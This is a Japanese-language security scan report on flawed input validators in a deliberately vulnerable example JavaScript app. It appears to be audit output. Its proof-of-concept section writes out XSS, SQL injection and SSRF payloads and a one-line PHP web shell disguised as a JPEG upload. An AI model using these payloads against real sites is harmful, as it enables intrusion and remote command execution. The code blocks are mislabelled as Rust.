# 解析レポート

![中高信頼度](https://img.shields.io/badge/信頼度-中高-orange) **信頼度スコア: 80**

## 脆弱性タイプ

- `XSS`
- `SQLI`
- `SSRF`
- `AFO`

## 解析結果

本コードは入力サニタイズが不完全であり、XSS／SQLインジェクション／SSRF／任意ファイルアップロード（AFO）の脆弱性を内包しています。
1. validateXSS: <iframe src="javascript:...">などのスキームや他タグが未検証であり、JavaScriptURIベースのXSSが可能です（行 12）。
2. validateSQL: 単純なキーワード置換とクォートエスケープのみで、MySQLの'#'コメントやセミコロン区切りが残存し、' OR '1'='1'# のようなSQLIが成立します（行 32）。
3. validateURL: プライベートIPチェックをせず、16進IP（0x7f000001）やURL短縮によるローカルホストアクセスが可能です（行 108）。
4. validateFile: 拡張子／MIMEだけの検証で、double extension（file.php.jpg）や内容を偽装したPHPアップロードが可能です（行 76）。

## PoC（概念実証コード）

```text
1) XSS:
   payload = '<iframe src="javascript:alert(1)"></iframe>'
   → validateXSS通過後に埋め込めばXSS発動
2) SQLI:
   payload = "' OR '1'='1'#"
   → validateSQL通過後にWHERE句に組み込むと常時真となる
3) SSRF:
   url = 'http://0x7f000001/admin'
   → validateURLではencoding未検出で通過し内部管理画面にアクセス可能
4) AFO:
   filename = 'shell.php.jpg'
   content = "<?php system($_GET['cmd']); ?>"
   mimetype = 'image/jpeg'
   → validateFileでvalid=trueとなり、PHPシェルをアップロード可能
```

## 関連コードコンテキスト

### 関数名: validateXSS
- 理由: 他のタグやjavascript:スキームはフィルタリング対象外のためXSSバイパス可能
- パス: example/javascript-vulnerable-app/utils/validators.js
```rust
filtered = filtered.replace(/<script[^>]*>/gi, '');
```

### 関数名: validateSQL
- 理由: キーワード置換のみで'#'コメントや';'は残存しSQLインジェクションを許容
- パス: example/javascript-vulnerable-app/utils/validators.js
```rust
filtered = filtered.replace(/\b${keyword}\b/, '***');
```

### 関数名: validateURL
- 理由: IPエンコーディングをチェックせずSSRFで内部ネットワークアクセス可能
- パス: example/javascript-vulnerable-app/utils/validators.js
```rust
const dangerousPatterns = [ /127\\.0\\.0\\.1/, ... ];
```

### 関数名: validateFile
- 理由: double extensionやMIME偽装による任意ファイルアップロードが可能
- パス: example/javascript-vulnerable-app/utils/validators.js
```rust
const extValid = allowedExtensions.includes('.' + ext);
```

## 解析ノート

各バリデータの不完全な正規表現と判定ロジックに着目し、代表的攻撃例を抽出

